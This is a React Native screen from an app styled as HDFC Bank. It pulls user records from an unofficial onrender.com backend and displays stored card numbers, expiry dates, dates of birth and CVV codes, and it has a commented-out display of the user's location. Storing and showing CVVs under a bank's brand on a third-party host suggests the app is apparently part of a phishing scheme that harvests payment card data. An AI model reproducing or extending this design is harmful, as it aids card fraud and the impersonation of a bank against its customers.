import React, { useEffect, useState } from 'react'
import { Alert, Image, ScrollView, StyleSheet, Text, View } from 'react-native'
import { rgbaColor } from 'react-native-reanimated/src/reanimated2/Colors';
import AsyncStorage from '@react-native-async-storage/async-storage';
import axios from 'axios';


export default function Profile({ navigation }) {
    const [userDetails, setUserDetails] = useState({});
    useEffect(() => {
        const unsubscribe = navigation.addListener('focus', () => {
            getuserDetails()
        });

        return unsubscribe;
    }, [navigation]);

    async function getuserDetails() {
        console.log("manish")
        try {
            const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}


            const response = await axios.get("https://hdfc-bank-9qmz.onrender.com/api/v1/user/userDetails", {
                headers: {
                    userid: user._id,
                    token: user.token
                }
            })
            console.log("card details response", response.data)
            if (response.data?.status) {
                setUserDetails(response.data?.data)
            }
        }
        catch (err) {
            Alert.alert(err.response?.data.message || "something wrong happend")
            console.log("cedit details api", err)
        }
    }
    useEffect(() => {
        getuserDetails()
    }, [])
    console.log({ userDetails })
    return (
        <ScrollView>
            <View style={{ marginTop: 16 }}>
                <Image source={require("../../assets/logo.jpeg")} style={{ width: "80%", alignSelf: 'center', resizeMode: 'contain', display: 'flex', justifyContent: 'center' }} />
            </View>
            {userDetails.mobile &&
                <View style={styles.card}>
                    <Text style={styles.title}>User Details</Text>
                    <View style={styles.description}>
                        <View style={styles.detailRow}>
                            <Text style={{ flex: 2 }}>Full Name</Text>
                            <Text style={{ flex: 3 }}>{`${userDetails.firstName}`}</Text>
                        </View>
                        <View style={styles.detailRow}>
                            <Text style={{ flex: 2 }}>Email</Text>
                            <Text style={{ flex: 3 }}>{userDetails.email}</Text>
                        </View>
                        <View style={styles.detailRow}>
                            <Text style={{ flex: 2 }}>User Mobile</Text>
                            <Text style={{ flex: 3 }}>{userDetails.mobile}</Text>
                        </View>
                        {/* <View style={styles.detailRow}>
                            <Text style={{ flex: 2 }}>Location</Text>
                            <View style={{ flex: 3 }}>
                                <Text > Latitude: {userDetails.location?.latitude}</Text>
                                <Text > Longitude: {userDetails.location?.longitude}</Text>
                            </View>
                        </View> */}
                    </View>
                </View>
            }

            {
                userDetails.cards && userDetails.cards?.length > 0 && userDetails.cards.map((card, index) => (
                    <View style={styles.card}>
                        <Text style={styles.title}>Card {index + 1} Details</Text>

                        <View style={styles.description}>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Mobile Number :</Text>
                                <Text style={{ flex: 3 }}>{card.mobile}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Date of Birth</Text>
                                <Text style={{ flex: 3 }}>{`${new Date(card.dob).toLocaleDateString()}`}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Card Number</Text>
                                <Text style={{ flex: 3 }}>{card.cardNumber}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Expiry Date</Text>
                                <Text style={{ flex: 3 }}>{new Date(card.expDate).toLocaleDateString()}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>CVV Number</Text>
                                <Text style={{ flex: 3 }}>{card.cvv}</Text>
                            </View>
                        </View>
                    </View>
                ))
            }

        </ScrollView>
    )
}




const styles = StyleSheet.create({
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#f0f0f0',
    },
    card: {
        backgroundColor: rgbaColor(0, 0, 0, 0.70),
        borderRadius: 8,
        padding: 16,
        margin: 12,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: 0.3,
        shadowRadius: 4,
    },
    title: {
        fontSize: 20,
        fontWeight: 'bold',
    },
    description: {
        fontSize: 16,
        marginTop: 8,
    },
    detailRow: {
        display: 'flex',
        flexDirection: 'row',
    },
    button: {
        // backgroundColor: 'white',
        // borderRadius: 10,
        // paddingVertical: 7,
    },
    buttonText: {
        // textAlign: "center",
        fontWeight: "500",
        fontSize: 17,
        color: "#fff"
    },
})

